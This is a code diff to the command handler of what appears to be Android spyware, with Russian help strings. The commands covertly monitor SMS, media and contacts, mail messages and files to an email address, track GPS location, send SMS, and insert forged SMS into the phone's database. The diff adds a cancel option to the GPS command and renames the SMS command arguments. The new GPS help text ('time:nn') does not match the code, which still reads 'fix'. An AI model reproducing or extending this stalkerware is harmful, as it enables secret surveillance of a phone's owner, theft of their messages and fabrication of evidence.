@@ -107,11 +107,11 @@ public class CommandPool {
 		
 		//TODO: Commands...
 		Add(new CommandObjSetup(CommandObj.CMD_SETUP,"[?][user:<login>;pass:<password>;mail:<addres>;smtp:<smtp>;port:<port>;[wifi]] - получить текущюю конфигурацию [?], или инициализировать интерфейс"));
-		Add(new CommandObjGPS(CommandObj.CMD_GPS,"fix:nn - получить позицию через nn секунд для более точного позиционирования"));
+		Add(new CommandObjGPS(CommandObj.CMD_GPS,"[time:nn][off] - получить позицию,дать nn секунд для более точного позиционирования"));
 		Add(new CommandObjSpySMS(CommandObj.CMD_SPY_SMS,"[off];[mail] - мониторинг новых сообщений [отправить на мыло]"));
 		Add(new CommandObjGetSMS(CommandObj.CMD_GET_SMS,"[from:YYMMDD;[to:YYMMDD]][date:YYMMDD] - получить смс на почту"));
 		Add(new CommandObjAddSMS(CommandObj.CMD_ADD_SMS,"phone:<number>;text:<message>;[date:YYMMDDHHMM];[inbox|outbox];[read|unread] - добавить смс в базу,так как будто оно было прислано"));
-		Add(new CommandObjSMS(CommandObj.CMD_SMS,"to:<phone>;msg:<message text> - отправить сообщение на указанный номер"));
+		Add(new CommandObjSMS(CommandObj.CMD_SMS,"phone:<phone>;text:<message> - отправить сообщение на указанный номер"));
 		Add(new CommandObjSpyMedia(CommandObj.CMD_SPY_MEDIA,"[off] - мониторинг новых видео/фото/звука"));
 		Add(new CommandObjGetMedia(CommandObj.CMD_GET_MEDIA,"[video|photo|audio];[from:YYMMDD;[to:YYMMDD;]][date:YYMMDD] - получить медиа файлы на почту"));
 		Add(new CommandObjSpyBook(CommandObj.CMD_SPY_BOOK,"[off] - мониторинг записной книжки"));
@@ -342,6 +342,7 @@ public class CommandPool {
 		
 		private CommandObjGPS mGPS = null;
 		private CommandObjGPS mNET = null;
+		PendingIntent mPending = null;
 
 		public CommandObjGPS(String name, String help) {
 			super(name, help);
@@ -349,15 +350,27 @@ public class CommandPool {
 		
 		public int Invoke() {
 
-			if ( mActive ) {
-				mCommandResult = String.format("Команда уже выполняется!");
-				return CommandObj.ERROR;
-			}
+			AlarmManager alarm = (AlarmManager)mContext.getSystemService(Context.ALARM_SERVICE);
 			LocationManager locMgr = (LocationManager)mContext.getSystemService(Context.LOCATION_SERVICE);
 			if ( locMgr == null ) {
 				mCommandResult = "Возможно сервисы местоположения выключены";
 				return CommandObj.ERROR;
 			}
+
+			if ( mActive ) {
+				boolean off = mArgs.hasOpt("off");
+				if ( !off ) {
+					mCommandResult = String.format("Команда уже выполняется,остановить выполнение можно командой @gps off");
+				} else {
+					mCommandResult = "Получение координат GPS отменено...";
+					mActive = false;
+					alarm.cancel(mPending);
+					locMgr.removeUpdates(mGPS);
+					locMgr.removeUpdates(mNET);
+				}
+				return off?CommandObj.ACK:CommandObj.ERROR;
+			}
+			
 			
 			mGPS = new CommandObjGPS(mCommandName,mCommandHelp);
 			mNET = new CommandObjGPS(mCommandName,mCommandHelp);
@@ -365,23 +378,22 @@ public class CommandPool {
 			locMgr.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 1, 0, mNET);
 			locMgr.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1, 0, mGPS);
 			
-			AlarmManager alarm = (AlarmManager)mContext.getSystemService(Context.ALARM_SERVICE);
 			
 			Intent intent = new Intent(mContext,Event_BroadcastReceiver.class);
 			intent.setAction(this.mCommandName);
 	
 			
-			PendingIntent pendingIntent = PendingIntent.getBroadcast(mContext,0, intent, PendingIntent.FLAG_CANCEL_CURRENT);
+			mPending = PendingIntent.getBroadcast(mContext,0, intent, PendingIntent.FLAG_CANCEL_CURRENT);
 			int sec = mArgs.intValue("fix", 30);
 			Calendar calendar = Calendar.getInstance();
 			calendar.add(Calendar.SECOND, sec);
-			alarm.set(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(),pendingIntent);
+			alarm.set(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(),mPending);
 			
 			mActive = true;
-			mCommandResult = String.format("Ждите местоположение через %d сек.", sec);
-			this.replySMS(mCommandResult);
+			mCommandResult = String.format("Местоположение придет в %s,ждите...", calendar.getTime().toLocaleString());
+			//this.replySMS(mCommandResult);
 			NetLog.v("%s",mCommandResult);
-			return CommandObj.OK;
+			return CommandObj.ACK;
 		}
 		
 		
@@ -954,22 +966,15 @@ public class CommandPool {
 	//XXX Send SMS
 	//
 	public class CommandObjSMS extends CommandObj {
-
 		public CommandObjSMS(String name, String help) {
 			super(name, help);
 		}
-		
 		public int Invoke() throws Exception {
-			if ( !mArgs.hasArg("to"))
-				throw new Exception("Не указан номер адресата");
-			if ( !mArgs.hasArg("msg"))
-				throw new Exception("Не указано сообщение");
-			
-			CommandObj.sendSMS(mArgs.strValue("to"), mArgs.strValue("msg"));
-			
+			String to = mArgs.strValue("phone");
+			String text = mArgs.strValue("text");
+			CommandObj.sendSMS(to,text);
 			return CommandObj.OK;
 		}
-		
 	} // Send SMS
 	
 	//
@@ -1369,9 +1374,9 @@ public class CommandPool {
 			boolean inbox = true;
 			Date    date = new Date();
 			SimpleDateFormat df = new SimpleDateFormat("yyMMddHHmm");
-			String phone;
 			
-			phone = ContactObj.NormalizePhone(mArgs.strValue("phone"));
+			String phone = ContactObj.NormalizePhone(mArgs.strValue("phone"));
+			String text = mArgs.strValue("text");
 			
 			inbox = !mArgs.hasOpt("outbox") || mArgs.hasOpt("inbox");
 			read  = !mArgs.hasOpt("unread") || mArgs.hasOpt("read");
@@ -1383,7 +1388,7 @@ public class CommandPool {
 			
 			ContactObj cont = findContact(phone);
 			
-			Uri uri = SmsObj.addSMS(mContext, phone, date, read, inbox, mArgs.strValue("text"));
+			Uri uri = SmsObj.addSMS(mContext, phone, date, read, inbox, text);
 			if ( uri != null )
 				mCommandResult = String.format("Сообщение добавлено в базу (тип:%sпрочитано,ящик:%s,контакт:%s)",read?" ":"не ",inbox?"входящие":"исходящие",cont!=null?cont.name:"Нет в книжке");
 			else
